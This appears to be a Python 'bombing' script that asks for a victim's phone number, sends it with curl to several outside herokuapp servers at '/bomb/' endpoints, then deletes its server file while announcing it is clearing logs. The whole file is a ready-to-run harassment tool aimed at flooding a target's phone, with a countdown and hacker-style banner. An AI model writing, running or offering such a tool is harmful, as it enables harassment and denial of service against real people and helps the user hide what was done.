import os

try:
    from colorama import *
    print('[!] Checking for Requirements')
    print(" ")
    print(Fore.RED + 'Colorama' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
except Exception as e:
    print(e)
    print("'Colorama' was not found!")
    print("Installing colorama")
    os.system('pip install colorama')

try:
    import os
    print(Fore.RED + 'os' + Fore.WHITE + '       [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
except Exception as e:
    print(e)
    print(Fore.RED + "'os' was not found!")


try:
    import time
    print(Fore.RED + 'time' + Fore.WHITE + '     [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
except Exception as e:
    print(e)
    print(Fore.RED + "'time' was not found!")

try:
    import random
    print(Fore.RED + 'random' + Fore.WHITE + '   [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
except Exception as e:
    print(e)
try:
    import datetime
    print(Fore.RED + 'datetime' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
except Exception as e:
    print(e)

input('Press enter to continue')
os.system("clear")


print("""
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `         
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!            
$R@i.~~ !     :   ~$$$$$B$$en:``              
?MXT@Wx.~    :     ~"##*$$$$M~                
""")


def startup_time():
    Time=datetime.datetime.now().strftime('%H:%M:%S')
    os.system('')
    print(' ')
    print(' ')
    print(Fore.WHITE + '[' + '\033[1;32m~' + Fore.WHITE + ']' + Fore.GREEN + 'Tool Started at ' + Fore.CYAN + Time)
print(startup_time())

number = input(Fore.WHITE + '[' + Fore.GREEN + '~' + Fore.WHITE + '] ' + Fore.GREEN + 'Enter the phone number of victim >_ ')

server1 = (' https://xlr81.herokuapp.com/bomb/'+number)
server2 = (' https://xlr82.herokuapp.com/bomb/'+number)
server3 = (' https://xlr83.herokuapp.com/bomb/'+number)
server4 = (' https://xlr84.herokuapp.com/bomb/'+number)
server5 = (' https://xlr85.herokuapp.com/bomb/'+number)
server6 = (' https://xlr86.herokuapp.com/bomb/'+number)

pair1 = [server1, server2, server3, server4, server5]
pair2 = [server2, server3, server4, server5, server6]
pair3 = [server3, server4, server5, server6, server1]
pair4 = [server4, server5, server6, server1, server2]
pair5 = [server5, server6, server1, server2, server3]
pair6 = [server6, server5, server4, server3, server2]

pairs_lst = [pair1, pair2, pair3, pair4, pair5, pair6]

def bombing_time():
    Time=datetime.datetime.now().strftime("%H:%M:%S")
    print(Fore.GREEN + 'Bombing started at ' + Fore.RED +Time)

def write_srvers():
    f = open("serverconf.txt", "w")
    l = random.choice(pairs_lst)
    f.writelines(l)
    print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + ' Bombing from the servers -->')
    print(Fore.WHITE + ".")
    print(l)
    f.close()

def read_servers():
    f = open("serverconf.txt", "r")
    os.system("curl"+f.read())
    print(" ")
    print(" ")
    print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.GREEN + " Clearing logs!")
    try:
        os.remove("serverconf.txt")
        print(Fore.WHITE + "[" + Fore.GREEN + "✓" + Fore.WHITE + "] " + Fore.GREEN + "Successfully cleared logs!")
    except Exception as e:
        print("✗"+e)


def main():
    write_srvers()
    read_servers() 

def countdown(t):
    
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print("[#]  "+timer, end="\r")
        time.sleep(1)
        t -= 1
    print("Initiating Bombing Servers...")
    bombing_time()
    main()

t = input(Fore.WHITE + "[" + Fore.GREEN + "~" + Fore.WHITE + "] " + Fore.GREEN + "Enter Bombing Delay in 'Seconds'(0 for NO DELAY) >_")
print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.GREEN + "Bombing in")
countdown(int(t))
